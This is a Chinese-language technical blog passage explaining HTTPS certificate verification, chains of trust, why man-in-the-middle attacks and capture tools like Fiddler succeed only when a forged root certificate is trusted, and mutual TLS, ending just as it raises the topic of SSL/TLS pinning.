&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNzricwiaRlwzuc1CUqXYTYEapwDNUybxhiaWfofHt7LSuzC4cFdYvwcJoA/640?wx_fmt=png" alt="">&lt;/p>
&lt;p>如果用户执意点击「继续浏览此网站」，相当于用户接受了中间人伪造的证书，那么后续整个 HTTPS 通信都能被中间人监听了。&lt;/p>
&lt;p>所以，这其实并不能说 HTTPS 不够安全，毕竟浏览器都已经提示证书有问题了，如果用户坚决要访问，那&lt;strong>不能怪 HTTPS ，得怪自己手贱&lt;/strong>。&lt;/p>
&lt;h2 id="客户端是如何验证证书的">客户端是如何验证证书的？&lt;a class="td-heading-self-link" href="#%e5%ae%a2%e6%88%b7%e7%ab%af%e6%98%af%e5%a6%82%e4%bd%95%e9%aa%8c%e8%af%81%e8%af%81%e4%b9%a6%e7%9a%84" aria-label="Heading self-link">&lt;/a>&lt;/h2>
&lt;p>接下来，详细说一下实际中数字证书签发和验证流程。&lt;/p>
&lt;p>如下图图所示，为数字证书签发和验证流程：&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNMxlSGIfI1kiav1TwxTK6ZtGiaCiaygM3g0fFnPYo3n9atZlbhvpkWt77Q/640?wx_fmt=png" alt="">
当服务端向 CA 机构申请证书的时候，CA 签发证书的过程，如上图左边部分：&lt;/p>
&lt;ul>
&lt;li>首先 CA 会把持有者的公钥、用途、颁发者、有效时间等信息打成一个包，然后对这些信息进行 Hash 计算，得到一个 Hash 值；&lt;/li>
&lt;li>然后 CA 会使用自己的私钥将该 Hash 值加密，生成 Certificate Signature，也就是 CA 对证书做了签名；&lt;/li>
&lt;li>最后将 Certificate Signature 添加在文件证书上，形成数字证书；&lt;/li>
&lt;/ul>
&lt;p>客户端校验服务端的数字证书的过程，如上图右边部分：&lt;/p>
&lt;ul>
&lt;li>首先客户端会使用同样的 Hash 算法获取该证书的 Hash 值 H1；&lt;/li>
&lt;li>通常浏览器和操作系统中集成了 CA 的公钥信息，浏览器收到证书后可以使用 CA 的公钥解密 Certificate Signature 内容，得到一个 Hash 值 H2 ；&lt;/li>
&lt;li>最后比较 H1 和 H2，如果值相同，则为可信赖的证书，否则则认为证书不可信。&lt;/li>
&lt;/ul>
&lt;p>但事实上，证书的验证过程中&lt;strong>还存在一个证书信任链的问题&lt;/strong>，因为我们向 CA 申请的证书一般不是根证书签发的，而是由中间证书签发的，比如百度的证书，从下图你可以看到，证书的层级有三级：&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNVINCkWDhqk7OiaibpvuUnYAt2GXtShM9z5bWCG1TSZH6LzzylakSk83w/640?wx_fmt=png" alt="">&lt;/p>
&lt;p>对于这种三级层级关系的证书的验证过程如下：&lt;/p>
&lt;ul>
&lt;li>客户端收到 baidu.com 的证书后，发现这个证书的签发者不是根证书，就无法根据本地已有的根证书中的公钥去验证 baidu.com 证书是否可信。于是，客户端根据 baidu.com 证书中的签发者，找到该证书的颁发机构是 “GlobalSign Organization Validation CA - SHA256 - G2”，然后向 CA 请求该中间证书。&lt;/li>
&lt;li>请求到证书后发现 “GlobalSign Organization Validation CA - SHA256 - G2” 证书是由 “GlobalSign Root CA” 签发的，由于 “GlobalSign Root CA” 没有再上级签发机构，说明它是根证书，也就是自签证书。应用软件会检查此证书有否已预载于根证书清单上，如果有，则可以利用根证书中的公钥去验证 “GlobalSign Organization Validation CA - SHA256 - G2” 证书，如果发现验证通过，就认为该中间证书是可信的。&lt;/li>
&lt;li>“GlobalSign Organization Validation CA - SHA256 - G2” 证书被信任后，可以使用 “GlobalSign Organization Validation CA - SHA256 - G2” 证书中的公钥去验证 baidu.com 证书的可信性，如果验证通过，就可以信任 baidu.com 证书。&lt;/li>
&lt;/ul>
&lt;p>在这四个步骤中，最开始客户端只信任根证书 GlobalSign Root CA 证书的，然后 “GlobalSign Root CA” 证书信任 “GlobalSign Organization Validation CA - SHA256 - G2” 证书，而 “GlobalSign Organization Validation CA - SHA256 - G2” 证书又信任 baidu.com 证书，于是客户端也信任 baidu.com 证书。总括来说，由于用户信任 GlobalSign，所以由 GlobalSign 所担保的 baidu.com 可以被信任，另外由于用户信任操作系统或浏览器的软件商，所以由软件商预载了根证书的 GlobalSign 都可被信任。&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNIPhXyF7S1WDIbuUbGwgLjwr47iau48ape1H3GYg8B0hDEKeqdz7xZgg/640?wx_fmt=png" alt="500">&lt;/p>
&lt;p>操作系统里一般都会内置一些根证书，比如我的 MAC 电脑里内置的根证书有这么多：&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNloHzrlsep6vZgNvz8sA8LDBHnAWyErqcpicRM6kovSB5L3IQcjdD5aw/640?wx_fmt=png" alt="">&lt;/p>
&lt;p>这样的一层层地验证就构成了一条信任链路，整个证书信任链验证流程如下图所示：&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNFruFDENMpzLgnfRH9T8uN0TAOItwoqia9mXLNLsE7UErltjyBu2zicNQ/640?wx_fmt=png" alt="">&lt;/p>
&lt;p>如果你的电脑中毒了，被恶意导入了中间人的根证书，那么在验证中间人的证书的时候，由于你操作系统信任了中间人的根证书，那么等同于中间人的证书是合法的。&lt;/p>
&lt;p>这种情况下，浏览器是不会弹出证书存在问题的风险提醒的。&lt;/p>
&lt;p>这其实也不关 HTTPS 的事情，是你电脑中毒了才导致 HTTPS 数据被中间人劫持的。&lt;/p>
&lt;p>所以，&lt;strong>HTTPS 协议本身到目前为止还是没有任何漏洞的，即使你成功进行中间人攻击，本质上是利用了客户端的漏洞（用户点击继续访问或者被恶意导入伪造的根证书），并不是 HTTPS 不够安全。&lt;/strong>&lt;/p>
&lt;h2 id="为什么抓包工具能截取-https-数据">为什么抓包工具能截取 HTTPS 数据？&lt;a class="td-heading-self-link" href="#%e4%b8%ba%e4%bb%80%e4%b9%88%e6%8a%93%e5%8c%85%e5%b7%a5%e5%85%b7%e8%83%bd%e6%88%aa%e5%8f%96-https-%e6%95%b0%e6%8d%ae" aria-label="Heading self-link">&lt;/a>&lt;/h2>
&lt;p>抓包工具 Fiddler 之所以可以明文看到 HTTPS 数据，工作原理与中间人一致的。&lt;/p>
&lt;p>对于 HTTPS 连接来说，中间人要满足以下两点，才能实现真正的明文代理:&lt;/p>
&lt;ol>
&lt;li>中间人，作为客户端与真实服务端建立连接这一步不会有问题，因为服务端不会校验客户端的身份；&lt;/li>
&lt;li>中间人，作为服务端与真实客户端建立连接，这里会有客户端信任服务端的问题，也就是服务端必须有对应域名的私钥；&lt;/li>
&lt;/ol>
&lt;p>中间人要拿到私钥只能通过如下方式：&lt;/p>
&lt;ol>
&lt;li>去网站服务端拿到私钥；&lt;/li>
&lt;li>去CA处拿域名签发私钥；&lt;/li>
&lt;li>自己签发证书，且被浏览器信任；&lt;/li>
&lt;/ol>
&lt;p>不用解释，抓包工具只能使用第三种方式取得中间人的身份。&lt;/p>
&lt;p>使用抓包工具进行 HTTPS 抓包的时候，需要在客户端安装 Fiddler 的根证书，这里实际上起认证中心（CA）的作用。&lt;/p>
&lt;p>Fiddler 能够抓包的关键是客户端会往系统受信任的根证书列表中导入 Fiddler 生成的证书，而这个证书会被浏览器信任，也就是 Fiddler 给自己创建了一个认证中心 CA。&lt;/p>
&lt;p>客户端拿着中间人签发的证书去中间人自己的 CA 去认证，当然认为这个证书是有效的。&lt;/p>
&lt;h2 id="如何避免被中间人抓取数据">如何避免被中间人抓取数据？&lt;a class="td-heading-self-link" href="#%e5%a6%82%e4%bd%95%e9%81%bf%e5%85%8d%e8%a2%ab%e4%b8%ad%e9%97%b4%e4%ba%ba%e6%8a%93%e5%8f%96%e6%95%b0%e6%8d%ae" aria-label="Heading self-link">&lt;/a>&lt;/h2>
&lt;p>我们要保证自己电脑的安全，不要被病毒乘虚而入，而且也不要点击任何证书非法的网站，这样 HTTPS 数据就不会被中间人截取到了。&lt;/p>
&lt;p>当然，我们还可以通过 HTTPS 双向认证来避免这种问题。&lt;/p>
&lt;p>一般我们的 HTTPS 是单向认证，客户端只会验证了服务端的身份，但是服务端并不会验证客户端的身份。&lt;/p>
&lt;p>如果用了双向认证方式，不仅客户端会验证服务端的身份，而且服务端也会验证客户端的身份。&lt;/p>
&lt;p>&lt;img src="https://mmbiz.qpic.cn/mmbiz_png/J0g14CUwaZf0Dm1SNmvUayxCflHTROibNccBibe4MEf260dWmCfGnvHgz7iaZza3s1Sq6UwibbuGickDfMIcwAlGBGQ/640?wx_fmt=png" alt="">&lt;/p>
&lt;p>服务端一旦验证到请求自己的客户端为不可信任的，服务端就拒绝继续通信，客户端如果发现服务端为不可信任的，那么也中止通信。&lt;/p>
&lt;h1 id="如何解决-ssltls-pinning">如何解决 SSL/TLS Pinning&lt;a class="td-heading-self-link" href="#%e5%a6%82%e4%bd%95%e8%a7%a3%e5%86%b3-ssltls-pinning" aria-label="Heading self-link">&lt;/a>&lt;/h1>
&lt;p>很多移动端应用程序为了防止自己被抓包，会使用 &lt;a href="https://desistdaydream.github.io/docs/7.%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Cryptography/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86/%E8%AF%81%E4%B9%A6%20%E4%B8%8E%20PKI/SSL_TLS%20Pinning.md">SSL/TLS Pinning&lt;/a> 技术。此时，就算我们在移动设备上向系统中添加了 Charles 的 CA 证书，很多接口的请求也抓不到，甚至有可能会提示无法连接网络。&lt;/p>
&lt;p>这该如何解决呢？&lt;/p></description></item></channel></rss>